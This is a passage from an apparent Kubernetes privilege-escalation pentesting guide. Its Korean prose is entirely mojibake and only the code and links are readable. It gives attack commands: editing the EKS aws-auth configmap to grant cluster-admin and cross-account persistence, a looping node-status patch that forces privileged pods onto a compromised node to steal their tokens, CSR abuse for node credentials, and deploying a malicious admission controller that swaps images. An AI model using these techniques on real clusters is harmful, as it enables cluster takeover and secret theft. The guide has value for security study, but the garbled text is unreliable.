ì½”ë“œ](https://github.com/kubernetes/kubernetes/blob/8418cccaf6a7307479f1dfeafb0d2823c1c37802/staging/src/k8s.io/apimachinery/pkg/util/rand/rand.go#L83)ì— ë”°ë¼ ìƒì„±ë©ë‹ˆë‹¤.

í† í°ì€ ì „ì²´ ì•ŒíŒŒë²³ ë° ìˆ«ì ë²”ìœ„ê°€ ì•„ë‹Œ ì œí•œëœ 27ì ë¬¸ì ì§‘í•©(`bcdfghjklmnpqrstvwxz2456789`)ì—ì„œ ìƒì„±ë©ë‹ˆë‹¤. ì´ ì œí•œìœ¼ë¡œ ì¸í•´ ì´ ê°€ëŠ¥í•œ ì¡°í•© ìˆ˜ê°€ 14,348,907(27^5)ë¡œ ì¤„ì–´ë“­ë‹ˆë‹¤. ê²°ê³¼ì ìœ¼ë¡œ ê³µê²©ìëŠ” ìƒëŒ€ì ìœ¼ë¡œ ëª‡ ì‹œê°„ ì•ˆì— í† í°ì„ ì¶”ì¸¡í•˜ê¸° ìœ„í•œ ë¸Œë£¨íŠ¸í¬ìŠ¤ ê³µê²©ì„ ì‹¤í–‰í•  ìˆ˜ ìˆìœ¼ë©°, ë¯¼ê°í•œ ì„œë¹„ìŠ¤ ê³„ì •ì— ì•¡ì„¸ìŠ¤í•˜ì—¬ ê¶Œí•œ ìƒìŠ¨ìœ¼ë¡œ ì´ì–´ì§ˆ ìˆ˜ ìˆìŠµë‹ˆë‹¤.

### ì¸ì¦ì„œ ì„œëª… ìš”ì²­

`certificatesigningrequests` ë¦¬ì†ŒìŠ¤ì—ì„œ **`create`** ë™ì‚¬ë¥¼ ê°€ì§€ê³  ìˆë‹¤ë©´(ë˜ëŠ” ì ì–´ë„ `certificatesigningrequests/nodeClient`ì—ì„œ), **ìƒˆ ë…¸ë“œì˜** ìƒˆ CeSRì„ **ìƒì„±**í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

[ë¬¸ì„œì— ë”°ë¥´ë©´ ì´ ìš”ì²­ì„ ìë™ìœ¼ë¡œ ìŠ¹ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤](https://kubernetes.io/docs/reference/command-line-tools-reference/kubelet-tls-bootstrapping/), ë”°ë¼ì„œ ì´ ê²½ìš° **ì¶”ê°€ ê¶Œí•œì´ í•„ìš”í•˜ì§€ ì•ŠìŠµë‹ˆë‹¤**. ê·¸ë ‡ì§€ ì•Šì€ ê²½ìš°, ìš”ì²­ì„ ìŠ¹ì¸í•  ìˆ˜ ìˆì–´ì•¼ í•˜ë©°, ì´ëŠ” `certificatesigningrequests/approval`ì—ì„œ ì—…ë°ì´íŠ¸í•˜ê³  `<signerNameDomain>/<signerNamePath>` ë˜ëŠ” `<signerNameDomain>/*`ì˜ resourceNameìœ¼ë¡œ `signers`ì—ì„œ `approve`í•´ì•¼ í•©ë‹ˆë‹¤.

í•„ìš”í•œ ëª¨ë“  ê¶Œí•œì„ ê°–ì¶˜ ì—­í• ì˜ **ì˜ˆì‹œ**ëŠ” ë‹¤ìŒê³¼ ê°™ìŠµë‹ˆë‹¤:
```yaml
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata:
name: csr-approver
rules:
- apiGroups:
- certificates.k8s.io
resources:
- certificatesigningrequests
verbs:
- get
- list
- watch
- create
- apiGroups:
- certificates.k8s.io
resources:
- certificatesigningrequests/approval
verbs:
- update
- apiGroups:
- certificates.k8s.io
resources:
- signers
resourceNames:
- example.com/my-signer-name # example.com/* can be used to authorize for all signers in the 'example.com' domain
verbs:
- approve
```
ê·¸ë˜ì„œ, ìƒˆ ë…¸ë“œ CSRì´ ìŠ¹ì¸ë˜ë©´ ë…¸ë“œì˜ íŠ¹ë³„í•œ ê¶Œí•œì„ ë‚¨ìš©í•˜ì—¬ ë¹„ë°€ì„ í›”ì¹˜ê³  ê¶Œí•œì„ ìŠ¹ê²©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

[**ì´ ê²Œì‹œë¬¼**](https://www.4armed.com/blog/hacking-kubelet-on-gke/) ë° [**ì´ ê²Œì‹œë¬¼**](https://rhinosecuritylabs.com/cloud-security/kubelet-tls-bootstrap-privilege-escalation/)ì—ì„œ GKE K8s TLS ë¶€íŠ¸ìŠ¤íŠ¸ë© êµ¬ì„±ì´ **ìë™ ì„œëª…**ìœ¼ë¡œ êµ¬ì„±ë˜ì–´ ìˆìœ¼ë©°, ìƒˆ K8s ë…¸ë“œì˜ ìê²© ì¦ëª…ì„ ìƒì„±í•˜ê³  ê·¸ê²ƒì„ ë‚¨ìš©í•˜ì—¬ ë¹„ë°€ì„ í›”ì¹˜ê³  ê¶Œí•œì„ ìŠ¹ê²©í•©ë‹ˆë‹¤. 
**ì–¸ê¸‰ëœ ê¶Œí•œì´ ìˆë‹¤ë©´ ë™ì¼í•œ ì‘ì—…ì„ ìˆ˜í–‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤**. ì²« ë²ˆì§¸ ì˜ˆì œëŠ” ìƒˆ ë…¸ë“œê°€ ìì‹ ì—ê²Œ ì¥ì°©ëœ ì»¨í…Œì´ë„ˆ ë‚´ì˜ ë¹„ë°€ì— ì•¡ì„¸ìŠ¤í•˜ëŠ” ê²ƒì„ ë°©ì§€í•˜ëŠ” ì˜¤ë¥˜ë¥¼ ìš°íšŒí•©ë‹ˆë‹¤. ì™œëƒí•˜ë©´ **ë…¸ë“œëŠ” ìì‹ ì—ê²Œ ì¥ì°©ëœ ì»¨í…Œì´ë„ˆì˜ ë¹„ë°€ì—ë§Œ ì•¡ì„¸ìŠ¤í•  ìˆ˜ ìˆê¸° ë•Œë¬¸ì…ë‹ˆë‹¤.**

ì´ë¥¼ ìš°íšŒí•˜ëŠ” ë°©ë²•ì€ **í¥ë¯¸ë¡œìš´ ë¹„ë°€ì´ ì¥ì°©ëœ ì»¨í…Œì´ë„ˆê°€ ìˆëŠ” ë…¸ë“œ ì´ë¦„ì— ëŒ€í•œ ë…¸ë“œ ìê²© ì¦ëª…ì„ ìƒì„±í•˜ëŠ” ê²ƒ**ì…ë‹ˆë‹¤ (ê·¸ëŸ¬ë‚˜ ì´ë¥¼ ìˆ˜í–‰í•˜ëŠ” ë°©ë²•ì€ ì²« ë²ˆì§¸ ê²Œì‹œë¬¼ì—ì„œ í™•ì¸í•˜ì‹­ì‹œì˜¤):
```bash
"/O=system:nodes/CN=system:node:gke-cluster19-default-pool-6c73b1-8cj1"
```
### AWS EKS aws-auth configmaps

AWS(EKS) í´ëŸ¬ìŠ¤í„°ì˜ kube-system ë„¤ì„ìŠ¤í˜ì´ìŠ¤ì—ì„œ **`configmaps`**ë¥¼ ìˆ˜ì •í•  ìˆ˜ ìˆëŠ” ì£¼ì²´ë“¤ì€ **aws-auth** configmapì„ ë®ì–´ì“°ë©´ í´ëŸ¬ìŠ¤í„° ê´€ë¦¬ì ê¶Œí•œì„ ì–»ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤.\
í•„ìš”í•œ ë™ì‚¬ëŠ” **`update`**ì™€ **`patch`**ì´ë©°, configmapì´ ìƒì„±ë˜ì§€ ì•Šì•˜ë‹¤ë©´ **`create`**ê°€ í•„ìš”í•©ë‹ˆë‹¤:
```bash
# Check if config map exists
get configmap aws-auth -n kube-system -o yaml

## Yaml example
apiVersion: v1
kind: ConfigMap
metadata:
name: aws-auth
namespace: kube-system
data:
mapRoles: |
- rolearn: arn:aws:iam::123456789098:role/SomeRoleTestName
username: system:node:{{EC2PrivateDNSName}}
groups:
- system:masters

# Create donfig map is doesn't exist
## Using kubectl and the previous yaml
kubectl apply -f /tmp/aws-auth.yaml
## Using eksctl
eksctl create iamidentitymapping --cluster Testing --region us-east-1 --arn arn:aws:iam::123456789098:role/SomeRoleTestName --group "system:masters" --no-duplicate-arns

# Modify it
kubectl edit -n kube-system configmap/aws-auth
## You can modify it to even give access to users from other accounts
data:
mapRoles: |
- rolearn: arn:aws:iam::123456789098:role/SomeRoleTestName
username: system:node:{{EC2PrivateDNSName}}
groups:
- system:masters
mapUsers: |
- userarn: arn:aws:iam::098765432123:user/SomeUserTestName
username: admin
groups:
- system:masters
```
{% endcode %}

{% hint style="warning" %}
**`aws-auth`**ë¥¼ ì‚¬ìš©í•˜ì—¬ **ì˜ì†ì„±**ì„ ì œê³µí•˜ì—¬ **ë‹¤ë¥¸ ê³„ì •**ì˜ ì‚¬ìš©ìì—ê²Œ ì•¡ì„¸ìŠ¤ ê¶Œí•œì„ ë¶€ì—¬í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

ê·¸ëŸ¬ë‚˜ `aws --profile other_account eks update-kubeconfig --name <cluster-name>`ì€ **ë‹¤ë¥¸ ê³„ì •ì—ì„œ ì‘ë™í•˜ì§€ ì•ŠìŠµë‹ˆë‹¤**. ê·¸ëŸ¬ë‚˜ ì‹¤ì œë¡œ `aws --profile other_account eks get-token --cluster-name arn:aws:eks:us-east-1:123456789098:cluster/Testing`ì€ í´ëŸ¬ìŠ¤í„°ì˜ ARNì„ ì´ë¦„ ëŒ€ì‹ ì— ë„£ìœ¼ë©´ ì‘ë™í•©ë‹ˆë‹¤.\
`kubectl`ì„ ì‘ë™ì‹œí‚¤ë ¤ë©´ **í”¼í•´ìì˜ kubeconfigë¥¼ êµ¬ì„±**í•˜ê³  aws exec argsì— `--profile other_account_role`ì„ ì¶”ê°€í•˜ì—¬ kubectlì´ í† í°ì„ ê°€ì ¸ì˜¤ê³  AWSì— ì—°ë½í•˜ê¸° ìœ„í•´ ë‹¤ë¥¸ ê³„ì • í”„ë¡œí•„ì„ ì‚¬ìš©í•˜ë„ë¡ ë§Œë“œì‹­ì‹œì˜¤.
{% endhint %}

### GKEì—ì„œ ìŠ¹ê²©í•˜ê¸°

**GCP ì£¼ì²´ì— K8s ê¶Œí•œì„ í• ë‹¹í•˜ëŠ” ë°©ë²•ì€ 2ê°€ì§€**ê°€ ìˆìŠµë‹ˆë‹¤. ì–´ë–¤ ê²½ìš°ì—ë„ ì£¼ì²´ëŠ” í´ëŸ¬ìŠ¤í„°ì— ì•¡ì„¸ìŠ¤í•  ìê²© ì¦ëª…ì„ ìˆ˜ì§‘í•  ìˆ˜ ìˆë„ë¡ **`container.clusters.get` ê¶Œí•œ**ë„ í•„ìš”í•˜ê±°ë‚˜ **ìì²´ kubectl êµ¬ì„± íŒŒì¼ì„ ìƒì„±**í•´ì•¼ í•©ë‹ˆë‹¤(ë‹¤ìŒ ë§í¬ë¥¼ ë”°ë¥´ì‹­ì‹œì˜¤).

{% hint style="warning" %}
K8s api ì—”ë“œí¬ì¸íŠ¸ì™€ í†µì‹ í•  ë•Œ **GCP ì¸ì¦ í† í°ì´ ì „ì†¡**ë©ë‹ˆë‹¤. ê·¸ëŸ° ë‹¤ìŒ GCPëŠ” K8s api ì—”ë“œí¬ì¸íŠ¸ë¥¼ í†µí•´ ë¨¼ì € **ì£¼ì²´(ì´ë©”ì¼ë¡œ)**ê°€ í´ëŸ¬ìŠ¤í„° ë‚´ì—ì„œ **ì•¡ì„¸ìŠ¤ ê¶Œí•œì´ ìˆëŠ”ì§€ í™•ì¸**í•œ í›„ **GCP IAMì„ í†µí•´ ì•¡ì„¸ìŠ¤ ê¶Œí•œì´ ìˆëŠ”ì§€ í™•ì¸**í•©ë‹ˆë‹¤.\
ì´ ì¤‘ **ì–´ëŠ í•˜ë‚˜ë¼ë„** ì°¸ì´ë©´ **ì‘ë‹µ**ë©ë‹ˆë‹¤. ê·¸ë ‡ì§€ ì•Šìœ¼ë©´ **GCP IAMì„ í†µí•´ ê¶Œí•œì„ ë¶€ì—¬í•˜ë¼ëŠ” ì˜¤ë¥˜**ê°€ í‘œì‹œë©ë‹ˆë‹¤.
{% endhint %}

ê·¸ëŸ° ë‹¤ìŒ, ì²« ë²ˆì§¸ ë°©ë²•ì€ **GCP IAM**ì„ ì‚¬ìš©í•˜ëŠ” ê²ƒì´ë©°, K8s ê¶Œí•œì—ëŠ” **í•´ë‹¹ GCP IAM ê¶Œí•œ**ì´ ìˆìœ¼ë©°, ì£¼ì²´ê°€ í•´ë‹¹ ê¶Œí•œì„ ê°€ì§€ê³  ìˆë‹¤ë©´ ì‚¬ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

{% content-ref url="../../gcp-security/gcp-privilege-escalation/gcp-container-privesc.md" %}
[gcp-container-privesc.md](../../gcp-security/gcp-privilege-escalation/gcp-container-privesc.md)
{% endcontent-ref %}

ë‘ ë²ˆì§¸ ë°©ë²•ì€ í´ëŸ¬ìŠ¤í„° ë‚´ì—ì„œ **ì´ë©”ì¼(í¬í•¨ëœ GCP ì„œë¹„ìŠ¤ ê³„ì •)**ì„ ì‹ë³„í•˜ì—¬ **K8s ê¶Œí•œì„ í• ë‹¹**í•˜ëŠ” ê²ƒì…ë‹ˆë‹¤.

### ì„œë¹„ìŠ¤ ê³„ì • í† í° ìƒì„±

**TokenRequestsë¥¼ ìƒì„±í•  ìˆ˜ ìˆëŠ” ì£¼ì²´**(`serviceaccounts/token`)ëŠ” K8s api ì—”ë“œí¬ì¸íŠ¸ì™€ í†µì‹ í•  ë•Œ SAs(ì—¬ê¸°ì„œ ì •ë³´ í™•ì¸: [**ì—¬ê¸°**](https://github.com/PaloAltoNetworks/rbac-police/blob/main/lib/token\_request.rego))ì…ë‹ˆë‹¤.

### ephemeralcontainers

**`pods/ephemeralcontainers`ë¥¼ `update`í•˜ê±°ë‚˜ `patch`í•  ìˆ˜ ìˆëŠ” ì£¼ì²´**ëŠ” **ë‹¤ë¥¸ íŒŒë“œì—ì„œ ì½”ë“œ ì‹¤í–‰**ì„ ì–»ì„ ìˆ˜ ìˆìœ¼ë©°, íŠ¹ê¶Œ ìˆëŠ” securityContextë¥¼ ê°€ì§„ ephemeral containerë¥¼ ì¶”ê°€í•˜ì—¬ ë…¸ë“œë¡œ **íƒˆì¶œ**í•  ìˆ˜ë„ ìˆìŠµë‹ˆë‹¤.

### ValidatingWebhookConfigurations ë˜ëŠ” MutatingWebhookConfigurations

`validatingwebhookconfigurations` ë˜ëŠ” `mutatingwebhookconfigurations` ìœ„ì— `create`, `update` ë˜ëŠ” `patch` ì¤‘ í•˜ë‚˜ì˜ ë™ì‚¬ë¥¼ ê°€ì§„ ì£¼ì²´ëŠ” **í•´ë‹¹ webhookconfigurations ì¤‘ í•˜ë‚˜ë¥¼ ìƒì„±**í•˜ì—¬ **ê¶Œí•œì„ ìŠ¹ê²©**í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

[`mutatingwebhookconfigurations` ì˜ˆì œëŠ” ì´ ê²Œì‹œë¬¼ì˜ ì´ ì„¹ì…˜ì„ í™•ì¸í•˜ì‹­ì‹œì˜¤](./#malicious-admission-controller).

### ìŠ¹ê²©

ë‹¤ìŒ ì„¹ì…˜ì—ì„œ ì½ì„ ìˆ˜ ìˆë“¯ì´: [**ë‚´ì¥ëœ íŠ¹ê¶Œ ìŠ¹ê²© ë°©ì§€**](./#built-in-privileged-escalation-prevention)ì— ë”°ë¥´ë©´, ì£¼ì²´ëŠ” **ìì‹ ì—ê²Œ ìƒˆ ê¶Œí•œì„ ë¶€ì—¬í•˜ì§€ ì•Šê³ ëŠ” ì—­í•  ë˜ëŠ” í´ëŸ¬ìŠ¤í„° ì—­í• ì„ ì—…ë°ì´íŠ¸í•˜ê±°ë‚˜ ìƒì„±í•  ìˆ˜ ì—†ìŠµë‹ˆë‹¤**. **`roles`** ë˜ëŠ” **`clusterroles`** ìœ„ì— **`escalate` ë™ì‚¬**ë¥¼ ê°€ì§€ê³  ìˆë‹¤ë©´, ê·¸ê°€ ê°€ì§„ ê¶Œí•œë³´ë‹¤ ë” ë‚˜ì€ ê¶Œí•œì„ ê°€ì§„ ìƒˆ ì—­í• , í´ëŸ¬ìŠ¤í„° ì—­í• ì„ ì—…ë°ì´íŠ¸/ìƒì„±í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

### ë…¸ë“œ í”„ë¡ì‹œ

**`nodes/proxy` í•˜ìœ„ ë¦¬ì†ŒìŠ¤ì— ì•¡ì„¸ìŠ¤í•  ìˆ˜ ìˆëŠ” ì£¼ì²´**ëŠ” Kubelet APIë¥¼ í†µí•´ **íŒŸì—ì„œ ì½”ë“œë¥¼ ì‹¤í–‰**í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤([**ì—¬ê¸°**](https://github.com/PaloAltoNetworks/rbac-police/blob/main/lib/nodes\_proxy.rego) ì°¸ì¡°). ì´ í˜ì´ì§€ì—ì„œ Kubelet ì¸ì¦ì— ëŒ€í•œ ìì„¸í•œ ì •ë³´ë¥¼ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:

{% content-ref url="../pentesting-kubernetes-services/kubelet-authentication-and-authorization.md" %}
[kubelet-authentication-and-authorization.md](../pentesting-kubernetes-services/kubelet-authentication-and-authorization.md)
{% endcontent-ref %}

ê¶Œí•œì´ ìˆëŠ” ì£¼ì²´ê°€ **íŒŸì„ ì‚­ì œ**(`pods` ë¦¬ì†ŒìŠ¤ì— ëŒ€í•œ `delete` ë™ì‚¬), **íŒŸì„ ì œê±°**(`pods/eviction` ë¦¬ì†ŒìŠ¤ì— ëŒ€í•œ `create` ë™ì‚¬), **íŒŸ ìƒíƒœ ë³€ê²½**(access to `pods/status`) ë° **ë‹¤ë¥¸ ë…¸ë“œë¥¼ ìŠ¤ì¼€ì¤„í•  ìˆ˜ ì—†ê²Œ ë§Œë“¤ ìˆ˜ ìˆëŠ” ì£¼ì²´**(`nodes/status`ì— ëŒ€í•œ ì•¡ì„¸ìŠ¤) ë˜ëŠ” **ë…¸ë“œë¥¼ ì‚­ì œ**(`nodes` ë¦¬ì†ŒìŠ¤ì— ëŒ€í•œ `delete` ë™ì‚¬)í•˜ê³  íŒŸì„ ì œì–´í•  ìˆ˜ ìˆëŠ” ê²½ìš°, **ë‹¤ë¥¸ ë…¸ë“œì—ì„œ íŒŸì„ ë„ë‚œë‹¹í•˜ì—¬** **ì·¨ì•½í•œ ë…¸ë“œ**ì—ì„œ ì‹¤í–‰ë˜ë„ë¡ ë§Œë“¤ê³  ê³µê²©ìê°€ í•´ë‹¹ íŒŸì—ì„œ **í† í°ì„ ë„ë‚œë‹¹**í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

{% code overflow="wrap" %}
```bash
patch_node_capacity(){
curl -s -X PATCH 127.0.0.1:8001/api/v1/nodes/$1/status -H "Content-Type: json-patch+json" -d '[{"op": "replace", "path":"/status/allocatable/pods", "value": "0"}]'
}

while true; do patch_node_capacity <id_other_node>; done &
#Launch previous line with all the nodes you need to attack

kubectl delete pods -n kube-system <privileged_pod_name>
```
{% endcode %}

### ì„œë¹„ìŠ¤ ìƒíƒœ (CVE-2020-8554)

**`services/status`**ë¥¼ **ìˆ˜ì •**í•  ìˆ˜ ìˆëŠ” ì£¼ì²´ëŠ” `status.loadBalancer.ingress.ip` í•„ë“œë¥¼ ì„¤ì •í•˜ì—¬ **ìˆ˜ì •ë˜ì§€ ì•Šì€ CVE-2020-8554ë¥¼ ì•…ìš©**í•˜ê³  **í´ëŸ¬ìŠ¤í„°ì— ëŒ€í•œ MiTM ê³µê²©ì„ ì‹œì‘**í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. CVE-2020-8554ì— ëŒ€í•œ ëŒ€ë¶€ë¶„ì˜ ì™„í™” ì¡°ì¹˜ëŠ” ì™¸ë¶€ IP ì„œë¹„ìŠ¤ë§Œì„ ë°©ì§€í•©ë‹ˆë‹¤ ([**ì—¬ê¸°**](https://github.com/PaloAltoNetworks/rbac-police/blob/main/lib/modify\_service\_status\_cve\_2020\_8554.rego)ì— ë”°ë¥´ë©´).

### ë…¸ë“œ ë° íŒŒë“œ ìƒíƒœ

`nodes/status` ë˜ëŠ” `pods/status`ì— ëŒ€í•œ **`update`** ë˜ëŠ” **`patch`** ê¶Œí•œì„ ê°€ì§„ ì£¼ì²´ëŠ” ë ˆì´ë¸”ì„ ìˆ˜ì •í•˜ì—¬ ì ìš©ë˜ëŠ” ìŠ¤ì¼€ì¤„ë§ ì œì•½ì„ ë³€ê²½í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

## ë‚´ì¥ëœ ê¶Œí•œ ìƒìŠ¹ ë°©ì§€

Kubernetesì—ëŠ” [ë‚´ì¥ëœ ë©”ì»¤ë‹ˆì¦˜](https://kubernetes.io/docs/reference/access-authn-authz/rbac/#privilege-escalation-prevention)ì´ ìˆì–´ ê¶Œí•œ ìƒìŠ¹ì„ ë°©ì§€í•©ë‹ˆë‹¤.

ì´ ì‹œìŠ¤í…œì€ **ì‚¬ìš©ìê°€ ì—­í• ì´ë‚˜ ì—­í•  ë°”ì¸ë”©ì„ ìˆ˜ì •í•˜ì—¬ ê¶Œí•œì„ ìƒìŠ¹ì‹œí‚¬ ìˆ˜ ì—†ë„ë¡** ë³´ì¥í•©ë‹ˆë‹¤. ì´ ê·œì¹™ì˜ ì‹œí–‰ì€ API ìˆ˜ì¤€ì—ì„œ ë°œìƒí•˜ì—¬ RBAC ì¸ê°€ìê°€ ë¹„í™œì„±í™”ë˜ì–´ ìˆì„ ë•Œì—ë„ ì•ˆì „ì¥ì¹˜ë¥¼ ì œê³µí•©ë‹ˆë‹¤.

ì´ ê·œì¹™ì€ **ì‚¬ìš©ìê°€ ì—­í• ì´ í¬í•¨í•˜ëŠ” ëª¨ë“  ê¶Œí•œì„ ì†Œìœ í•´ì•¼ë§Œ ì—­í• ì„ ìƒì„±í•˜ê±°ë‚˜ ì—…ë°ì´íŠ¸í•  ìˆ˜ ìˆë‹¤**ê³  ê·œì •í•©ë‹ˆë‹¤. ë˜í•œ, ì‚¬ìš©ìì˜ ê¸°ì¡´ ê¶Œí•œ ë²”ìœ„ëŠ” ìƒì„±í•˜ê±°ë‚˜ ìˆ˜ì •í•˜ë ¤ëŠ” ì—­í• ì˜ ë²”ìœ„ì™€ ì¼ì¹˜í•´ì•¼ í•©ë‹ˆë‹¤: ClusterRolesì˜ ê²½ìš° í´ëŸ¬ìŠ¤í„° ì „ì²´ ë˜ëŠ” Rolesì˜ ê²½ìš° ë™ì¼í•œ ë„¤ì„ìŠ¤í˜ì´ìŠ¤(ë˜ëŠ” í´ëŸ¬ìŠ¤í„° ì „ì²´)ë¡œ ì œí•œë©ë‹ˆë‹¤.

{% hint style="warning" %}
ì´ì „ ê·œì¹™ì—ëŠ” ì˜ˆì™¸ê°€ ìˆìŠµë‹ˆë‹¤. ì£¼ì²´ê°€ **`roles`** ë˜ëŠ” **`clusterroles`** ìœ„ì— **`escalate` ë™ì‚¬**ë¥¼ ê°€ì§€ê³  ìˆë‹¤ë©´ ê¶Œí•œì´ ì—†ì–´ë„ ì—­í•  ë° í´ëŸ¬ìŠ¤í„° ì—­í• ì˜ ê¶Œí•œì„ ë†’ì¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤.
{% endhint %}

### **RoleBindings/ClusterRoleBindings ê°€ì ¸ì˜¤ê¸° ë° ìˆ˜ì •í•˜ê¸°**

{% hint style="danger" %}
**ì´ ê¸°ìˆ ì€ ì´ì „ì— ì‘ë™í–ˆì§€ë§Œ, ì œ í…ŒìŠ¤íŠ¸ì— ë”°ë¥´ë©´ ì´ì „ ì„¹ì…˜ì—ì„œ ì„¤ëª…í•œ ì´ìœ ë¡œ ë” ì´ìƒ ì‘ë™í•˜ì§€ ì•ŠìŠµë‹ˆë‹¤. ê¶Œí•œì´ ì—†ëŠ” ê²½ìš° ìì‹ ì´ë‚˜ ë‹¤ë¥¸ SAì— ê¶Œí•œì„ ë¶€ì—¬í•˜ê¸° ìœ„í•´ rolebindingì„ ìƒì„±í•˜ê±°ë‚˜ ìˆ˜ì •í•  ìˆ˜ ì—†ìŠµë‹ˆë‹¤.**
{% endhint %}

Rolebindingsë¥¼ ìƒì„±í•  ê¶Œí•œì€ ì‚¬ìš©ìê°€ **ì„œë¹„ìŠ¤ ê³„ì •ì— ì—­í• ì„ ë°”ì¸ë”©**í•  ìˆ˜ ìˆê²Œ í•©ë‹ˆë‹¤. ì´ ê¶Œí•œì€ **ì‚¬ìš©ìê°€ ì†ìƒëœ ì„œë¹„ìŠ¤ ê³„ì •ì— ê´€ë¦¬ì ê¶Œí•œì„ ë°”ì¸ë”©í•  ìˆ˜ ìˆê¸° ë•Œë¬¸ì— ê¶Œí•œ ìƒìŠ¹ìœ¼ë¡œ ì´ì–´ì§ˆ ìˆ˜ ìˆìŠµë‹ˆë‹¤.**

## ê¸°íƒ€ ê³µê²©

### ì‚¬ì´ë“œì¹´ í”„ë¡ì‹œ ì•±

ê¸°ë³¸ì ìœ¼ë¡œ íŒŒë“œ ê°„ í†µì‹ ì—ëŠ” ì•”í˜¸í™”ê°€ ì—†ìŠµë‹ˆë‹¤. ìƒí˜¸ ì¸ì¦, ì–‘ë°©í–¥, íŒŒë“œ ê°„ í†µì‹ .

#### ì‚¬ì´ë“œì¹´ í”„ë¡ì‹œ ì•± ìƒì„± <a href="#create-a-sidecar-proxy-app" id="create-a-sidecar-proxy-app"></a>

.yaml íŒŒì¼ì„ ìƒì„±í•˜ì„¸ìš”.
```bash
kubectl run app --image=bash --command -oyaml --dry-run=client > <appName.yaml> -- sh -c 'ping google.com'
```
.yaml íŒŒì¼ì„ í¸ì§‘í•˜ê³  ì£¼ì„ ì²˜ë¦¬ëœ ë¼ì¸ì„ ì¶”ê°€í•˜ì‹­ì‹œì˜¤:
```yaml
#apiVersion: v1
#kind: Pod
#metadata:
#  name: security-context-demo
#spec:
#  securityContext:
#    runAsUser: 1000
#    runAsGroup: 3000
#    fsGroup: 2000
#  volumes:
#  - name: sec-ctx-vol
#    emptyDir: {}
#  containers:
#  - name: sec-ctx-demo
#    image: busybox
command: [ "sh", "-c", "apt update && apt install iptables -y && iptables -L && sleep 1h" ]
securityContext:
capabilities:
add: ["NET_ADMIN"]
#   volumeMounts:
#   - name: sec-ctx-vol
#     mountPath: /data/demo
#   securityContext:
#     allowPrivilegeEscalation: true
```
í”„ë¡ì‹œì˜ ë¡œê·¸ë¥¼ í™•ì¸í•˜ì„¸ìš”:
```bash
kubectl logs app -C proxy
```
ë” ë§ì€ ì •ë³´: [https://kubernetes.io/docs/tasks/configure-pod-container/security-context/](https://kubernetes.io/docs/tasks/configure-pod-container/security-context/)

### ì•…ì˜ì ì¸ Admission Controller

Admission ControllerëŠ” ê°ì²´ê°€ ì˜ì†í™”ë˜ê¸° ì „ì— Kubernetes API ì„œë²„ë¡œì˜ ìš”ì²­ì„ ê°€ë¡œì±„ì§€ë§Œ ìš”ì²­ì´ ì¸ì¦ë˜ê³  ìŠ¹ì¸ëœ í›„ì— ì²˜ë¦¬í•©ë‹ˆë‹¤.

ê³µê²©ìê°€ Mutationg Admission Controllerë¥¼ ì‚½ì…í•˜ëŠ” ë°©ë²•ì„ ì°¾ìœ¼ë©´ ì´ë¯¸ ì¸ì¦ëœ ìš”ì²­ì„ ìˆ˜ì •í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ë¥¼ í†µí•´ ê¶Œí•œ ìƒìŠ¹ ë° í´ëŸ¬ìŠ¤í„°ì— ì§€ì†ì ìœ¼ë¡œ ë‚¨ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤.

**ì˜ˆì‹œ** [**https://blog.rewanthtammana.com/creating-malicious-admission-controllers**](https://blog.rewanthtammana.com/creating-malicious-admission-controllers):
```bash
git clone https://github.com/rewanthtammana/malicious-admission-controller-webhook-demo
cd malicious-admission-controller-webhook-demo
./deploy.sh
kubectl get po -n webhook-demo -w
```
ìƒíƒœë¥¼ í™•ì¸í•˜ì—¬ ì¤€ë¹„ë˜ì—ˆëŠ”ì§€ í™•ì¸í•˜ì‹­ì‹œì˜¤:
```bash
kubectl get mutatingwebhookconfigurations
kubectl get deploy,svc -n webhook-demo
```
![mutating-webhook-status-check.PNG](https://cdn.hashnode.com/res/hashnode/image/upload/v1628433436353/yHUvUWugR.png?auto=compress,format\&format=webp)

ê·¸ëŸ° ë‹¤ìŒ ìƒˆë¡œìš´ íŒŒë“œë¥¼ ë°°í¬í•˜ì‹­ì‹œì˜¤:
```bash
kubectl run nginx --image nginx
kubectl get po -w
```
`ErrImagePull` ì˜¤ë¥˜ë¥¼ ë³¼ ë•Œ ì´ë¯¸ì§€ ì´ë¦„ì„ ë‹¤ìŒ ì¿¼ë¦¬ ì¤‘ í•˜ë‚˜ë¡œ í™•ì¸í•˜ì‹­ì‹œì˜¤:
```bash
kubectl get po nginx -o=jsonpath='{.spec.containers[].image}{"\n"}'
kubectl describe po nginx | grep "Image: "
```
![malicious-admission-controller.PNG](https://cdn.hashnode.com/res/hashnode/image/upload/v1628433512073/leFXtgSzm.png?auto=compress,format\&format=webp)

ìœ„ì˜ ì´ë¯¸ì§€ì—ì„œ ë³¼ ìˆ˜ ìˆë“¯ì´, ìš°ë¦¬ëŠ” `nginx` ì´ë¯¸ì§€ë¥¼ ì‹¤í–‰í•˜ë ¤ê³  ì‹œë„í–ˆì§€ë§Œ ìµœì¢… ì‹¤í–‰ëœ ì´ë¯¸ì§€ëŠ” `rewanthtammana/malicious-image`ì…ë‹ˆë‹¤. ë¬´ìŠ¨ ì¼ì´ ë²Œì–´ì¡Œë‚˜ìš”!!?

#### ê¸°ìˆ ì  ì„¸ë¶€ ì •ë³´ <a href="#heading-technicalities" id="heading-technicalities"></a>

